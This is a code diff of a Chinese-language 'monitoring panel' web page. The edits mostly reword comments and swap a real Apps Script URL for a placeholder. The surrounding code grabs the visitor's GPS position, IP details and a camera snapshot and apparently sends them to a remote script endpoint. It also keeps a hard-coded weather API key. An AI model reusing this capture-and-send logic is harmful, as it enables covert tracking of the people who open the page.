@@ -4,7 +4,8 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>高級監控面板</title>
-  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script> <!-- 若不需要，可刪除這行 -->
+  <!-- 若不需要 Chart.js，可刪除以下這行 -->
+  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
   <style>
     /* 成功訊息 */
     .msg-success {
@@ -118,7 +119,7 @@
     /************************************************
      * 1. 統一管理你的 Apps Script URL
      ************************************************/
-    const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzSYYuYmGzMJ4Ze96ECoCyGXKfUueDXFRB3_kDMdee8JNp6W6RvM8RjT80VaUHt8Ck2aw/exec';
+    const SCRIPT_URL = 'https://script.google.com/macros/s/替換成你自己的ID/exec';
 
     /************************************************
      * 2. 登入 / 註冊邏輯
@@ -215,7 +216,7 @@
           };
         });
 
-        // 可視情況縮短拍照延遲
+        // 可視情況縮短拍照延遲 (500ms 或自行調整)
         await new Promise(resolve => setTimeout(resolve, 500));
 
         const canvas = document.createElement('canvas');
@@ -225,7 +226,7 @@
         const context = canvas.getContext('2d');
         context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-        // 降低品質來壓縮
+        // 調整 JPEG 品質 (0.8)
         const photoData = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
         return photoData;
       } catch (error) {
@@ -284,10 +285,12 @@
       };
 
       try {
+        // 同時取得GPS與IP
         const [gpsResult, ipResult] = await Promise.allSettled([
           getGpsCoordinates(),
           getIpInfo(),
         ]);
+        // 相機拍照
         const photoResult = await startCamera();
 
         if (gpsResult.status === 'fulfilled') {
@@ -333,7 +336,9 @@
         }
       } catch (error) {
         console.error('資料收集或傳送過程中發生錯誤:', error);
-        if (statusElement) statusElement.innerText = '資料收集或傳送過程中發生錯誤。';
+        if (statusElement) {
+          statusElement.innerText = '資料收集或傳送過程中發生錯誤。';
+        }
       }
     }
 
@@ -343,6 +348,7 @@
     async function getWeatherInfo(latitude, longitude) {
       try {
         if (!latitude || !longitude) return;
+        // 請改成你自己的 API Key
         const apiKey = 'ae0c5817d5c802a5f12d3c9de2517611';
         const response = await fetch(`https://api.openweathermap.org/data/2.5/weather?lat=${latitude}&lon=${longitude}&units=metric&lang=zh_tw&appid=${apiKey}`);
         const weatherData = await response.json();
@@ -351,7 +357,7 @@
         const humidity = weatherData.main.humidity;
 
         const weatherInfo = document.getElementById('weatherInfo');
-        weatherInfo.innerHTML = 
+        weatherInfo.innerHTML =
           `<img src="https://openweathermap.org/img/wn/${weatherData.weather[0].icon}.png" alt="${weather}">
            溫度: ${temp}°C, 天氣: ${weather}, 濕度: ${humidity}%`;
       } catch (error) {
@@ -371,12 +377,12 @@
       const gpsData = await getGpsCoordinates();
       if (gpsData) {
         // 設定地圖
-        document.getElementById('map').src = 
+        document.getElementById('map').src =
           `https://www.google.com/maps?q=${gpsData.latitude},${gpsData.longitude}&hl=zh-TW&z=15&output=embed`;
         // 取得天氣
         getWeatherInfo(gpsData.latitude, gpsData.longitude);
       }
-      // 確保顯示主功能區（若你希望「不用登入也看得到」）
+      // 若你想「不用登入也看得到面板」，就讓 mainPanel 預設打開
       mainPanel.style.display = 'block';
     });
   </script>
